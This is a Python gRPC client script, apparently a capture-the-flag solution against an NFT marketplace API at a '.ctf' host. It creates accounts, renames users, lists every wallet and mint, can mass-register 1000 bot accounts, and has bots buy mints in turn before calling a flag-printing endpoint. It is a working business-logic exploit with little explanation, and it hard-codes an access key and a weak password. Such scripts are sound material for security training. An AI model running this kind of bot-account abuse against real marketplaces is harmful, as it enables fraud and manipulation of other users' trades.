import grpc
import enoki_pb2
import enoki_pb2_grpc

import inspect
from typing import Any

EnokiStub = enoki_pb2_grpc.EnokiStub

ACCESS_KEY = "7f92661039251f38a06dde28ff997caa52c88e8c"
CREDENTIALS = {"username": "damien", "password": "password"}
ID_WALLET = 2
NFT_ID = 2
NFT_MINT_ID = 2

CREATE_USER = False
CREATE_NFT = False
MINT_NFT = False
CREATE_BOT_USERS = False
BID_MINT_BOT = False
BUY_MINT_BOT = True

def client(access_key, ca_cert):
    metadata = (('rpc-auth', access_key),)

    def flagPrinter(stub: EnokiStub, ctx: dict):
        res = stub.FlagPrinter(request=ctx['creds'], metadata=metadata)
        return res

    def createUser(stub: EnokiStub, _ctx: dict, username: str, password: str):
        request = enoki_pb2.WalletCredentials(username=username, password=password)
        res = stub.WalletCreator(request=request, metadata=metadata)
        return res

    def changeUsername(stub: EnokiStub, _ctx: dict, username: str, password: str, new_username: str):
        creds = enoki_pb2.WalletCredentials(username=username, password=password)
        request = enoki_pb2.UsernameChange(creds=creds, username=new_username)
        res = stub.UsernameChanger(request=request, metadata=metadata)
        return res

    def getAllWallets(stub: EnokiStub, ctx: dict):
        request = ctx['creds']
        res = stub.WalletsViewer(request=request, metadata=metadata)
        return res

    def getAllMyMints(stub: EnokiStub, ctx: dict):
        res = stub.MintsViewer(request=ctx['creds'], metadata=metadata)
        return res

    def createNFT(stub: EnokiStub, ctx: dict):
        request = enoki_pb2.NFTCreate(creds=ctx['ucreds'], name="pipi", data="data:image/pas-important") 
        res1 = stub.NFTCreator(request=request, metadata=metadata)
        bid = enoki_pb2.NFTMint(creds=ctx['ucreds'], id_nft=res1.id_nft, buyout=100)
        res2 = stub.NFTMinter(request=bid, metadata=metadata)
        return (res1, res2)

    def mintNFT(stub: EnokiStub, ctx: dict, id_nft: int):
        bid = enoki_pb2.NFTMint(creds=ctx['ucreds'], id_nft=id_nft, buyout=100)
        res = stub.NFTMinter(request=bid, metadata=metadata)
        return res

    def bidNFT(stub: EnokiStub, ctx: dict, nft_mint_id: int, username: str, password: str):
        creds = enoki_pb2.WalletCredentials(username=username, password=password)
        bid = enoki_pb2.MintBid(creds=creds, id_minted=nft_mint_id, bid=0)
        res = stub.MintBidder(request=bid, metadata=metadata)
        return res

    def buyNFT(stub: EnokiStub, ctx: dict, nft_mint_id: int, username: str, password: str):
        creds = enoki_pb2.WalletCredentials(username=username, password=password)
        bid = enoki_pb2.MintBuy(creds=creds, id_minted=nft_mint_id)
        res = stub.MintBuyer(request=bid, metadata=metadata)
        return res


    with grpc.secure_channel('nftapi.ctf:50054', grpc.ssl_channel_credentials(ca_cert)) as channel:
        stub = enoki_pb2_grpc.EnokiStub(channel)
        ctx = {
            'creds': enoki_pb2.CredentialsWrapper(creds=enoki_pb2.WalletCredentials(**CREDENTIALS)),
            ## Unwrapped credentials
            'ucreds': enoki_pb2.WalletCredentials(**CREDENTIALS)
        }
        if CREATE_USER:
            print("Create user:")
            res = request(ctx, stub, createUser, **CREDENTIALS)
            print(res)
        if CREATE_NFT:
            print("Create NFT:")
            res = request(ctx, stub, createNFT)
            print(res[0].id_nft)
        elif MINT_NFT:
            print("Minting NFT:")
            res = request(ctx, stub, mintNFT, id_nft=NFT_ID)
            print(res)

        res = request(ctx, stub, createUser, username="eheheh", password="eheheh")
        res = request(ctx, stub, changeUsername, username="eheheh", password="eheheh", new_username="Mr. Spirigalof")
        print("Changed username to Mr. Spirigalof", res)

        print("\nWallets:")
        for fun in request(ctx, stub, getAllWallets):
            print(fun)

        print("\nMints:")
        for fun in request(ctx, stub, getAllMyMints):
            print(fun)

        if CREATE_BOT_USERS:
            for i in range(1000):
                x = "Bot" + str(i)
                request(ctx, stub, createUser, username=x, password=x)
                print(f"Bot {i} created")
        if BUY_MINT_BOT:
            for i in range(10):
                x = "Bot" + str(i)
                # (_, mint) = request(ctx, stub, createNFT)
                # id_minted = mint.id_minted
                id_minted = 2 + i
                print(f"Bot {i} buying mint {id_minted}")
                res = request(ctx, stub, buyNFT, nft_mint_id=id_minted, username=x, password=x)
                print("Bought?", res)

        res = request(ctx, stub, flagPrinter)
        print("Flag printer:", res)

def request(ctx, stub, fun, *extraArgs, **extraKwargs) -> Any:
    try:
        response = fun(stub, ctx, *extraArgs, **extraKwargs)
        return response
    except grpc.RpcError as error:
        print("Exception:", error.code())
        print(error.details())

if __name__ == '__main__':
    with open('../ca.crt', 'rb') as f:
        ca_cert = f.read()
    client(ACCESS_KEY, ca_cert)

